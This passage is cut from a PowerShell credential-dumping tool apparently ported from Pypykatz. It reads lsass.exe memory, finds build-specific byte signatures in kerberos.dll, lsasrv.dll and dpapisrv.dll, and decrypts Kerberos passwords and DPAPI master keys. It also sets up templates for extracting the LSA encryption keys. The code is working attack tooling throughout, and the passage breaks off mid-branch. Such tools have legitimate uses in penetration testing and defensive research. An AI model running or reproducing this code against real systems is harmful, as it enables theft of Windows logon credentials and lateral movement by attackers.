		If (($Entry["Credentials"]["Password"]["Buffer"] -ne 0) -and ($Entry["Credentials"]["Password"]["MaximumLength"] -gt 0))
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Entry["Credentials"]["Password"]["Buffer"])
			If ($Buff)
			{
				If ($Entry["Credentials"]["Password"]["MaximumLength"] -gt 0)
				{
					$EncPwd = $Buff[$OffAddr..($OffAddr + $Entry["Credentials"]["Password"]["MaximumLength"] - 1)]
					$KerberosCredential["Password"] = LSADecrypt-Pwd $KerberosDecryptor["LSA_Decryptor"] $EncPwd $KerberosCredential["UserName"] $False
				}
			}
		}

		If ($Entry["SmartcardInfos"] -ne 0)
		{
			# Not tested

			<#
			$CSP_Info = @{}
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Entry["SmartcardInfos"]
			If ($Buff)
			{
				$Buff = $Buff[$OffAddr..($OffAddr + $Buff.Length - 1)]
				$BaseAddr += $OffAddr
				$KerberosDecryptor["Decryptor_Template"]["CSP_Info_Struct"].Invoke($Buff, $CSP_Info, $BaseAddr)
			}

			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($CSP_Info["PinCode"]["Buffer"])
			If ($Buff)
			{
				If ($CSP_Info["PinCode"]["MaximumLength"] -gt 0)
				{
					$EncPIN = $Buff[$OffAddr..($OffAddr + $CSP_Info["PinCode"]["MaximumLength"] - 1)]
					$KerberosCredential["PIN"] = LSADecrypt-Pwd $KerberosDecryptor["LSA_Decryptor"] $EncPIN $Null $True
				}
			}

			If ($CSP_Info["CspDataLength"])
			{
				If ($CSP_Info["CspDataLength"] -ne 0)
				{
					$KerberosCredential["CardInfo"] = @{}
					Get-Infos $CSP_Info["CspData"]["bBuffer"] $KerberosCredential["CardInfo"] $CSP_Info["CspData"]["nCardNameOffset"] $CSP_Info["CspData"]["nReaderNameOffset"] $CSP_Info["CspData"]["nContainerNameOffset"] $CSP_Info["CspData"]["nCSPNameOffset"]
				}
			}
			#>
		}

		If ($Entry["pKeyList"] -ne 0)
		{
			# Not tested and not terminated in Pypykatz

			<#
			$Key_List = @{}
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Entry["pKeyList"]
			If ($Buff)
			{
				$Buff = $Buff[$OffAddr..($OffAddr + $Buff.Length - 1)]
				$BaseAddr += $OffAddr
				$KerberosDecryptor["Decryptor_Template"]["Keys_List_Struct"].Invoke($Buff, $Key_List, $BaseAddr)
			}
			#>
		}

		$KerberosDecryptor["CurrentCred"] = $KerberosCredential

		# Not tested

		<#
		If (($Entry["Tickets_1"]["Flink"] -ne 0) -and ($Entry["Tickets_1"]["Flink"] -ne $Entry["Tickets_1"]["Flink_Loc"]) -and ($Entry["Tickets_1"]["Flink"] -ne ($Entry["Tickets_1"]["Flink_Loc"] - 4)))
		{
			$KerberosDecryptor["Current_Ticket_Type"] = "TGS"
			Walk-List $KerberosDecryptor $Dump["LsassHandle"] $Dump["LsassPages"] $Entry["Tickets_1"]["Flink"] $Entry["Tickets_1"]["Flink_Loc"] ((Get-Item "function:Handle-Ticket").ScriptBlock) $KerberosDecryptor["Decryptor_Template"]["Kerberos_Ticket_Struct"] 0
		}

		If (($Entry["Tickets_2"]["Flink"] -ne 0) -and ($Entry["Tickets_2"]["Flink"] -ne $Entry["Tickets_2"]["Flink_Loc"]) -and ($Entry["Tickets_2"]["Flink"] -ne ($Entry["Tickets_2"]["Flink_Loc"] - 4)))
		{
			$KerberosDecryptor["Current_Ticket_Type"] = "Client"
			Walk-List $KerberosDecryptor $Dump["LsassHandle"] $Dump["LsassPages"] $Entry["Tickets_2"]["Flink"] $Entry["Tickets_2"]["Flink_Loc"] ((Get-Item "function:Handle-Ticket").ScriptBlock) $KerberosDecryptor["Decryptor_Template"]["Kerberos_Ticket_Struct"] 0
		}

		If (($Entry["Tickets_3"]["Flink"] -ne 0) -and ($Entry["Tickets_3"]["Flink"] -ne $Entry["Tickets_3"]["Flink_Loc"]) -and ($Entry["Tickets_3"]["Flink"] -ne ($Entry["Tickets_3"]["Flink_Loc"] - 4)))
		{
			$KerberosDecryptor["Current_Ticket_Type"] = "TGT"
			Walk-List $KerberosDecryptor $Dump["LsassHandle"] $Dump["LsassPages"] $Entry["Tickets_3"]["Flink"] $Entry["Tickets_3"]["Flink_Loc"] ((Get-Item "function:Handle-Ticket").ScriptBlock) $KerberosDecryptor["Decryptor_Template"]["Kerberos_Ticket_Struct"] 0
		}
		#>

		$KerberosDecryptor["Current_Ticket_Type"] = ""
		$KerberosDecryptor["Credentials"] += ,($KerberosDecryptor["CurrentCred"])

		return
	}

	# Find Kerberos signature address in kerberos.dll pages
	$SigPos = $Null
	$SigIndexes = $Null
	ForEach ($Module in $Dump["LsassModules"])
	{
		If ($Module["Name"] -eq "kerberos.dll")
		{
			ForEach ($Page in $Module["Pages"])
			{
				$PageBuff, $SigIndexes = SearchMemory $Dump["LsassHandle"] @($Page) $Page["BaseAddress"] $KerberosDecryptor["Decryptor_Template"]["Signature"]
				If ($SigIndexes)
				{
					If ($SigIndexes.Count -gt 1)
					{
						$SigPos = $Page["BaseAddress"] + $SigIndexes[0]
					}
					Else
					{
						$SigPos = $Page["BaseAddress"] + $SigIndexes
					}

					Break
				}
			}
		}

		If ($SigIndexes) { Break }
	}
	If (-not $SigPos)
	{
		Write-Host ("[-] Unable to find Kerberos signature into kerberos.dll module")
		return $Null
	}
	Write-Host ("[+] Found Kerberos signature at address 0x{0:X8} into kerberos.dll module. Parsing entries" -f ($SigPos))

	# Iterate over Kerberos entries
	$Addr = $SigPos + $KerberosDecryptor["Decryptor_Template"]["First_Entry_Offset"]
	$Ptr_Entry_Loc = GetPtr-WithOffset $Dump["LsassHandle"] $Dump["LsassPages"] $Addr $Dump["SysInfo"]["ProcessorArchitecture"]
	If ($Ptr_Entry_Loc)
	{
		$Ptr_Entry = GetPtr $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr_Entry_Loc $Dump["SysInfo"]["ProcessorArchitecture"]
		If ($Ptr_Entry)
		{
			$PRTL_AVL_TABLE = GetPtr $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr_Entry $Dump["SysInfo"]["ProcessorArchitecture"]
			If ($PRTL_AVL_TABLE)
			{
				$Buff, $OffAddr, $BaseAddr = ReadMemory $Dump["LsassHandle"] $Dump["LsassPages"] $PRTL_AVL_TABLE
				If ($Buff)
				{
					$Buff = $Buff[$OffAddr..($Buff.Length - 1)]
					$BaseAddr += $OffAddr

					$RTL_AVL_TABLE = @{}
					RTL_AVL_TABLE $Buff $RTL_AVL_TABLE $BaseAddr
					$Result_Ptr_List = @()
					Walk-AVL $Dump["LsassHandle"] $Dump["LsassPages"] $RTL_AVL_TABLE["BalancedRoot"]["RightChild"] ([ref]$Result_Ptr_List)

					ForEach ($Ptr in $Result_Ptr_List)
					{
						$Buff, $OffAddr, $BaseAddr = ReadMemory $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr
						If ($Buff)
						{
							$Buff = $Buff[$OffAddr..($Buff.Length - 1)]
							$BaseAddr += $OffAddr

							$Kerberos_Logon_Session = @{}
							$KerberosDecryptor["Decryptor_Template"]["Kerberos_Session_Struct"].Invoke($Buff, $Kerberos_Logon_Session, $BaseAddr)

							Process-Session $KerberosDecryptor $Dump["LsassHandle"] $Dump["LsassPages"] $Kerberos_Logon_Session
						}
					}
				}
			}
		}
	}

	return $KerberosDecryptor
}

<#
	DPAPI Templates
#>
function LSASS-Get-DPAPISecrets($Dump, $LSADecryptor)
{
	<### DPAPI Templates ###>

	$DPAPITemplate = @{}
	$DPAPITemplate["Signature"] = $Null
	$DPAPITemplate["First_Entry_Offset"] = $Null
	$DPAPITemplate["List_Entry"] = $Null

	function KIWI_MASTERKEY_CACHE_ENTRY($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Flink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Blink"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LUID" $Struct
		$StructToWrite["LogonID"] = $Struct["Value"]
		$StructToWrite["KeyUID"] = MKGUID $Buff[$Offset..($Offset + 16 - 1)]
		$Offset = $Offset + 16
		GetType $Buff $BaseAddr ([ref]$Offset) "GUID" $StructToWrite["KeyUID"]
		$StructToWrite["InsertTime"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $StructToWrite["InsertTime"]
		$StructToWrite["KeySize"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		If ($StructToWrite["KeySize"] -lt 512)
		{
			$StructToWrite["Key"] = ReadBuff $Buff $StructToWrite["KeySize"] ([ref]$Offset)
		}
		Else { $StructToWrite["Key"] = $Null }

		return
	}

	$DPAPITemplate["List_Entry"] = (Get-Item "function:KIWI_MASTERKEY_CACHE_ENTRY").ScriptBlock
	If ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_INTEL)
	{
		# Processor x86
		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
		{
			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
			return $Null
		}
		ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_8)
		{
			$DPAPITemplate["Signature"] = @(0x33, 0xc0, 0x40, 0xa3)
			$DPAPITemplate["First_Entry_Offset"] = -4
		}
		ElseIf (($Global:MINBUILD_WIN_8 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_BLUE))
		{
			$DPAPITemplate["Signature"] = @(0x8b, 0xf0, 0x81, 0xfe, 0xcc, 0x06, 0x00, 0x00, 0x0f, 0x84)
			$DPAPITemplate["First_Entry_Offset"] = -16
		}
		Else
		{
			$DPAPITemplate["Signature"] = @(0x33, 0xc0, 0x40, 0xa3)
			$DPAPITemplate["First_Entry_Offset"] = -4
		}
	}
	ElseIf ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_AMD64)
	{
		# Processor x64
		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
		{
			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
			return $Null
		}
		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
		{
			$DPAPITemplate["Signature"] = @(0x49, 0x3b, 0xef, 0x48, 0x8b, 0xfd, 0x0f, 0x84)
			$DPAPITemplate["First_Entry_Offset"] = -4
		}
		ElseIf (($Global:MINBUILD_WIN_7 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_8))
		{
			$DPAPITemplate["Signature"] = @(0x33, 0xc0, 0xeb, 0x20, 0x48, 0x8d, 0x05)
			$DPAPITemplate["First_Entry_Offset"] = 7
		}
		ElseIf (($Global:MINBUILD_WIN_8 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_BLUE))
		{
			$DPAPITemplate["Signature"] = @(0x4c, 0x89, 0x1f, 0x48, 0x89, 0x47, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85)
			$DPAPITemplate["First_Entry_Offset"] = -4
		}
		ElseIf (($Global:MINBUILD_WIN_BLUE -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1507))
		{
			$DPAPITemplate["Signature"] = @(0x08, 0x48, 0x39, 0x48, 0x08, 0x0f, 0x85)
			$DPAPITemplate["First_Entry_Offset"] = -10
		}
		ElseIf (($Global:BUILD_WIN_10_1507 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1607))
		{
			$DPAPITemplate["Signature"] = @(0x48, 0x89, 0x4e, 0x08, 0x48, 0x39, 0x48, 0x08)
			$DPAPITemplate["First_Entry_Offset"] = -7
		}
		Else
		{
			$DPAPITemplate["Signature"] = @(0x48, 0x89, 0x4f, 0x08, 0x48, 0x89, 0x78, 0x08)
			$DPAPITemplate["First_Entry_Offset"] = 11
		}
	}

	<### DPAPI Decryptor ###>

	$DPAPIDecryptor = @{}
	$DPAPIDecryptor["Decryptor_Template"] = $DPAPITemplate
	$DPAPIDecryptor["LSA_Decryptor"] = $LSADecryptor
	$DPAPIDecryptor["Credentials"] = @()

	<### Functions ###>

	# Callback functions
	# Use same signature : $DPAPIDecryptor, $Handle, $Pages, $Entry, $EntryAddr
	function Add-Entry($DPAPIDecryptor, $Handle, $Pages, $Entry, $EntryAddr)
	{
		If (-not $Entry["Key"]) { Return }

		If (($Entry["Key"]) -and ($Entry["KeySize"] -gt 0))
		{
			$DPAPICredential = @{}
			$DPAPICredential["CredType"] = "DPAPI"
			$DPAPICredential["LUID"] = $Null
			$DPAPICredential["Key_GUID"] = $Null
			$DPAPICredential["MasterKey"] = $Null
			$DPAPICredential["SHA1_MasterKey"] = $Null

			$DPAPICredential["MasterKey"] = LSADecrypt-Pwd $DPAPIDecryptor["LSA_Decryptor"] $Entry["Key"] $Null $True
			$Hasher = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
			$DPAPICredential["SHA1_MasterKey"] = $Hasher.ComputeHash($DPAPICredential["MasterKey"])

			$DPAPICredential["LUID"] = $Entry["LogonID"]
			$DPAPICredential["Key_GUID"] = $Entry["KeyUID"]

			$DPAPIDecryptor["Credentials"] += ,($DPAPICredential)
		}

		return
	}

	# Find DPAPI signature address in lsasrv.dll/dpapisrv.dll pages
	$SigPos_LSASrv = $Null
	$SigPos_DPAPISrv = $Null
	$SigIndexes = $Null
	ForEach ($Module in $Dump["LsassModules"])
	{
		If ($Module["Name"] -eq "lsasrv.dll")
		{
			ForEach ($Page in $Module["Pages"])
			{
				$PageBuff, $SigIndexes = SearchMemory $Dump["LsassHandle"] @($Page) $Page["BaseAddress"] $DPAPIDecryptor["Decryptor_Template"]["Signature"]
				If ($SigIndexes)
				{
					If ($SigIndexes.Count -gt 1)
					{
						$SigPos_LSASrv = $Page["BaseAddress"] + $SigIndexes[0]
					}
					Else
					{
						$SigPos_LSASrv = $Page["BaseAddress"] + $SigIndexes
					}

					Break
				}
			}
		}

		If ($Module["Name"] -eq "dpapisrv.dll")
		{
			ForEach ($Page in $Module["Pages"])
			{
				$PageBuff, $SigIndexes = SearchMemory $Dump["LsassHandle"] @($Page) $Page["BaseAddress"] $DPAPIDecryptor["Decryptor_Template"]["Signature"]
				If ($SigIndexes)
				{
					If ($SigIndexes.Count -gt 1)
					{
						$SigPos_DPAPISrv = $Page["BaseAddress"] + $SigIndexes[0]
					}
					Else
					{
						$SigPos_DPAPISrv = $Page["BaseAddress"] + $SigIndexes
					}

					Break
				}
			}
		}

		If ($SigPos_LSASrv -and $SigPos_DPAPISrv) { Break }
	}
	If ((-not $SigPos_LSASrv) -and (-not $SigPos_DPAPISrv))
	{
		Write-Host ("[-] Unable to find DPAPI signature into both lsasrv.dll and dpapisrv.dll module")
		return $Null
	}

	If ($SigPos_LSASrv)
	{
		Write-Host ("[+] Found DPAPI signature at address 0x{0:X8} into lsasrv.dll module. Parsing entries" -f ($SigPos_LSASrv))

		# Iterate over DPAPI entries
		$Addr = $SigPos_LSASrv + $DPAPIDecryptor["Decryptor_Template"]["First_Entry_Offset"]
		$Ptr_Entry_Loc = GetPtr-WithOffset $Dump["LsassHandle"] $Dump["LsassPages"] $Addr $Dump["SysInfo"]["ProcessorArchitecture"]
		If ($Ptr_Entry_Loc)
		{
			$Ptr_Entry = GetPtr $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr_Entry_Loc $Dump["SysInfo"]["ProcessorArchitecture"]
			If ($Ptr_Entry)
			{
				Walk-List $DPAPIDecryptor $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr_Entry $Ptr_Entry_Loc ((Get-Item "function:Add-Entry").ScriptBlock) $DPAPIDecryptor["Decryptor_Template"]["List_Entry"] 0
			}
		}
	}

	If ($SigPos_DPAPISrv)
	{
		Write-Host ("[+] Found DPAPI signature at address 0x{0:X8} into dpapisrv.dll module. Parsing entries" -f ($SigPos_DPAPISrv))

		# Iterate over DPAPI entries
		$Addr = $SigPos_DPAPISrv + $DPAPIDecryptor["Decryptor_Template"]["First_Entry_Offset"]
		$Ptr_Entry_Loc = GetPtr-WithOffset $Dump["LsassHandle"] $Dump["LsassPages"] $Addr $Dump["SysInfo"]["ProcessorArchitecture"]
		If ($Ptr_Entry_Loc)
		{
			$Ptr_Entry = GetPtr $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr_Entry_Loc $Dump["SysInfo"]["ProcessorArchitecture"]
			If ($Ptr_Entry)
			{
				Walk-List $DPAPIDecryptor $Dump["LsassHandle"] $Dump["LsassPages"] $Ptr_Entry $Ptr_Entry_Loc ((Get-Item "function:Add-Entry").ScriptBlock) $DPAPIDecryptor["Decryptor_Template"]["List_Entry"] 0
			}
		}
	}

	return $DPAPIDecryptor
}

<### Get LSA Keys for decrypting stored secrets in lsass.exe ###>

function LSASS-Get-LSAEncryptionKeys($Dump)
{
	<### LSA Templates ###>

	$LSATemplate = @{}
	$LSATemplate["Key_Pattern"] = @{}
	$LSATemplate["Key_Handle_Struct"] = $Null
	$LSATemplate["Key_Struct"] = $Null
	$LSATemplate["Key_Struct_Tag"] = $Null

	# Define memory templates depending on architecture and OS build
	function KIWI_BCRYPT_KEY($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Size"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Tag"] = ReadBuff $Buff 4 ([ref]$Offset)
		$StructToWrite["Type"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["cbSecret"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Data"] = ReadBuff $Buff $StructToWrite["cbSecret"] ([ref]$Offset)

		return
	}

	function KIWI_BCRYPT_KEY8($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Size"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Tag"] = ReadBuff $Buff 4 ([ref]$Offset)
		$StructToWrite["Type"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk4"] =  GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["cbSecret"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Data"] = ReadBuff $Buff $StructToWrite["cbSecret"] ([ref]$Offset)

		return
	}

	function KIWI_BCRYPT_KEY81($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Size"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Tag"] = ReadBuff $Buff 4 ([ref]$Offset)
		$StructToWrite["Type"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk5"] =  GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["cbSecret"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Data"] = ReadBuff $Buff $StructToWrite["cbSecret"] ([ref]$Offset)

		return
	}

	function KIWI_BCRYPT_KEY81_NEW($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Size"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Tag"] = ReadBuff $Buff 4 ([ref]$Offset)
		$StructToWrite["Type"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Unk5"] =  GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk10"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["cbSecret"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Data"] = ReadBuff $Buff $StructToWrite["cbSecret"] ([ref]$Offset)

		return
	}

	function KIWI_BCRYPT_HANDLE_KEY($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Size"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Tag"] = ReadBuff $Buff 4 ([ref]$Offset)
		$StructToWrite["hAlgorithm"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Ptr_Key"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	$Is64Bit = $True
	If ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_INTEL)
	{
		# Processor x86
		$Is64Bit = $False
		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
		{
			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
			return $Null
		}
		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
		{
			$LSATemplate["Key_Pattern"]["Signature"] = @(0x6a, 0x02, 0x6a, 0x10, 0x68)
			$LSATemplate["Key_Pattern"]["IV_Length"] = 16
			$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 5
			$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -76
			$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = -21
			$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
			$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY").ScriptBlock
			$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
			$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
		}
		ElseIf (($Global:MINBUILD_WIN_7 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_8))
		{
			$LSATemplate["Key_Pattern"]["Signature"] = @(0x6a, 0x02, 0x6a, 0x10, 0x68)
			$LSATemplate["Key_Pattern"]["IV_Length"] = 16
			$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 5
			$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -76
			$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = -21
			$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
			$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY").ScriptBlock
			$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
			$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
		}
		ElseIf (($Global:MINBUILD_WIN_8 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_BLUE))
		{
			$LSATemplate["Key_Pattern"]["Signature"] = @(0x6a, 0x02, 0x6a, 0x10, 0x68)
			$LSATemplate["Key_Pattern"]["IV_Length"] = 16
			$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 5
			$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -69
			$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = -18
			$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
			$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY8").ScriptBlock
			$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
			$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
		}
		ElseIf (($Global:MINBUILD_WIN_BLUE -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_10))
		{
			$LSATemplate["Key_Pattern"]["Signature"] = @(0x6a, 0x02, 0x6a, 0x10, 0x68)
			$LSATemplate["Key_Pattern"]["IV_Length"] = 16
			$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 5
			$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -69
			$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = -18
			$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
			$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY81").ScriptBlock
			$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
			$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
		}
		ElseIf (($Global:MINBUILD_WIN_10 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -le $Global:BUILD_WIN_10_1507))
		{
			$LSATemplate["Key_Pattern"]["Signature"] = @(0x6a, 0x02, 0x6a, 0x10, 0x68)
			$LSATemplate["Key_Pattern"]["IV_Length"] = 16
			$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 5
			$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -79
			$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = -22
			$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
			$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY81").ScriptBlock
			$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
			$LSATemplate["Key_Handle_Struct"] = (Get-Item "function:KIWI_BCRYPT_HANDLE_KEY").ScriptBlock
		}
		ElseIf (($Global:BUILD_WIN_10_1507 -gt $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1909))
		{
			$LSATemplate["Key_Pattern"]["Signature"] = @(0x6a, 0x02, 0x6a, 0x10, 0x68)
			$LSATemplate["Key_Pattern"]["IV_Length"] = 16
			$LSATemplate["Key_Pattern"]["Offset_To_IV_Ptr"] = 5
			$LSATemplate["Key_Pattern"]["Offset_To_DES_Key_Ptr"] = -79
			$LSATemplate["Key_Pattern"]["Offset_To_AES_Key_Ptr"] = -22
			$LSATemplate["Key_Struct_Tag"] = @(0x4b, 0x53, 0x53, 0x4d)
			$LSATemplate["Key_Struct"] = (Get-Item "function:KIWI_BCRYPT_KEY81").ScriptBlock
			$LSATemplate["Key_Handle_Struct_Tag"] = @(0x52, 0x55, 0x55, 0x55)
